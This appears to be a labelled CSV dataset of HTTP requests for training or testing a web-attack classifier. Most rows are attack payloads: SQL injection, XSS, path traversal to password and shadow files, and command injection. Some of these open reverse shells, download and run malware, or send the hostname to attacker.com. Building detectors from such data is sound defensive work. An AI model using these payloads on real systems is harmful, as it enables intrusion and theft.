request_text,label
"GET /api/auth?q=admin' OR '1'='1' LIMIT 1-- HTTP/1.1
Host: example.com",sqli
"GET /orders HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"GET /images?file=%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: example.com",traversal
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check&& python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",cmdi
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check| wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m",cmdi
"GET /api/file?file=../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /admin/login?q=1' GROUP BY 1-- HTTP/1.1
Host: example.com",sqli
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8&& whoami",cmdi
"GET /api/auth?q=' UNION SELECT null,null,null-- HTTP/1.1
Host: example.com",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment='><script>alert(1)</script>&user=test",xss
"GET /profile?q=<script>alert('XSS')</script> HTTP/1.1
Host: example.com",xss
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' AND SLEEP(5)--&password=test",sqli
"GET /comment?q=<video src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost&& nmap -sV localhost",cmdi
"GET /files?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"GET /files?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /run?host=test| id HTTP/1.1
Host: example.com",cmdi
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8; printenv",cmdi
"GET /admin/login?q=' AND 1=BENCHMARK(5000000,MD5('a'))-- HTTP/1.1
Host: example.com",sqli
"GET /debug?host=test| cat /etc/shadow HTTP/1.1
Host: example.com",cmdi
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 OR 1=1--&password=test",sqli
"GET /api/file?file=/proc/self/cmdline HTTP/1.1
Host: example.com",traversal
"GET /search?q=javascript:alert(document.cookie) HTTP/1.1
Host: example.com",xss
"GET /tools?host=check&& env HTTP/1.1
Host: example.com",cmdi
"GET /product?q=1 UNION SELECT user()-- HTTP/1.1
Host: example.com",sqli
"GET /search?q=wireless mouse&page=10&sort=asc HTTP/1.1
Host: example.com",benign
"GET /files?file=%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check; nc -e /bin/sh attacker.com 4444",cmdi
"GET /checkout?q='; WAITFOR DELAY '0:0:5'-- HTTP/1.1
Host: example.com",sqli
"GET /api/data?limit=84&offset=92&format=json HTTP/1.1
Host: example.com",benign
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8; id",cmdi
"GET /posts?q=<input onfocus=alert(1) autofocus> HTTP/1.1
Host: example.com",xss
"GET /api/file?file=../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /feedback?q=<ScRiPt>alert(1)</ScRiPt> HTTP/1.1
Host: example.com",xss
"GET /settings HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 AND SLEEP(5)--&password=test",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=grace&password=SecureP@ss1",benign
"GET /api/execute?host=192.168.1.1$(curl attacker.com/c2?h=$(hostname)) HTTP/1.1
Host: example.com",cmdi
"GET /debug?host=localhost&& env HTTP/1.1
Host: example.com",cmdi
"GET /static?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"GET /view?file=..%252f..%252fetc%252fpasswd HTTP/1.1
Host: example.com",traversal
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1' LIMIT 1--&password=test",sqli
"GET /static?file=..\..\..\windows\win.ini HTTP/1.1
Host: example.com",traversal
"GET /profile?q=<ScRiPt>alert(1)</ScRiPt> HTTP/1.1
Host: example.com",xss
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1`id`",cmdi
"GET /static?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost$(curl attacker.com/c2?h=$(hostname))",cmdi
"GET /files?file=expect://id HTTP/1.1
Host: example.com",traversal
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost| dir C:\",cmdi
"GET /api/file?file=....//..//etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /exec?host=192.168.1.1| dir C:\ HTTP/1.1
Host: example.com",cmdi
"GET /exec?host=8.8.8.8&& ls /etc HTTP/1.1
Host: example.com",cmdi
"GET /files?file=../../../../proc/self/environ HTTP/1.1
Host: example.com",traversal
"PUT /api/users/alice HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""alice@email.com"",""name"":""Alice""}",benign
